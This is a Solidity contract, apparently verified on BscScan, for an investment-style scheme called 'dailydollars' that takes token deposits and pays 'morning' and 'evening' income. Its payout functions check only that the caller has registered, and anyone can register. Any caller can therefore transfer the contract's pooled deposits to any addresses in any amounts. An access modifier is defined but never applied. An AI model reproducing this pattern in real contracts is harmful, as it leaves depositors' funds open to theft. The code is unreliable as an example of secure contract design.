/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

// SPDX-License-Identifier: GPLv3


pragma solidity ^0.8.17; 

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

pragma solidity ^0.8.17;

interface IERC20 {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external payable returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external payable returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract notConation {
    address public _contract;
    constructor() {
        _contract = msg.sender;
    }

    modifier notApplicable() { 
        /** validation check **/
        require(_contract == msg.sender, "Contract: caller is not the contract");
        _;
    }
}

contract dailydollars is notConation {
    using SafeMath for uint256; 
    IERC20 public Busd;
    address private owner;
    uint256 public startTime;
    address public _usdtAddr;
    address public _receiver;
    
    struct User {
        uint user_id;
        address user_address;
        bool is_exist;
    }

    mapping(address => User) public users;
    mapping(address => uint) balance;
    event RegUserEvent(address indexed UserAddress, uint UserId);
    event InvestedEvent(address indexed UserAddress, uint256 InvestAmount);
    event LevelEarnEvent(address [] Caller, uint256 [] Earned);
    event SelfLeaderEarnEvent(address Caller, uint256 Earned);
    event LeaderEarnedEvent(address [] Caller, uint256 [] Earned);
    event WithdrawEvent(address Caller, uint256 Earned);

    event HappyMorningIncome(address [] Caller, uint256 [] Earned);
    event EnjoyEveningIncome(address [] Caller, uint256 [] Earned);
    
    constructor() {
        _usdtAddr = address(0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee);
        _receiver = address(0x8d835063CD4B54BD15e11Bac99828E684C16D28e);
        Busd = IERC20(_usdtAddr);
        startTime = block.timestamp;
    }

    function addUsers(uint _user_id) external {
        require(users[msg.sender].is_exist == false,  "User Exist");
        users[msg.sender] = User({
            user_id: _user_id,
            user_address: msg.sender,
            is_exist: true
        });
        //totalUser = totalUser.add(1);
        emit RegUserEvent(msg.sender, _user_id);
    }

    function packageactiveself(uint256 _amount) external payable {
        require(users[msg.sender].is_exist == true,  "User not Exist");
        Busd.transferFrom(msg.sender, address(this), _amount);
        emit InvestedEvent(msg.sender,_amount);

    }


 function happymorningIncome(address[] memory _happymorningAdd, uint256[] memory _happymorningComm) external payable {
        require(users[msg.sender].is_exist == true,  "User not Exist");
        if(_happymorningAdd.length>0){
            sendmul(_happymorningAdd,_happymorningComm);
            emit HappyMorningIncome(_happymorningAdd,_happymorningComm);
        }
    }


     function enjoyeveningIncome(address[] memory _enjoyeveningAdd, uint256[] memory _enjoyeveningComm) external payable {
        require(users[msg.sender].is_exist == true,  "User not Exist");
        if(_enjoyeveningAdd.length>0){
            sendmul(_enjoyeveningAdd,_enjoyeveningComm);
            emit EnjoyEveningIncome(_enjoyeveningAdd,_enjoyeveningComm);
        }
    }


    function sendmul(address[] memory _leveladd, uint256[] memory _levelcomm) internal {
        for(uint256 i = 0; i < _leveladd.length; i++){
            Busd.transfer(_leveladd[i], _levelcomm[i]);
            //payable(_leveladd[i]).transfer(_levelcomm[i]);
        }
    }

}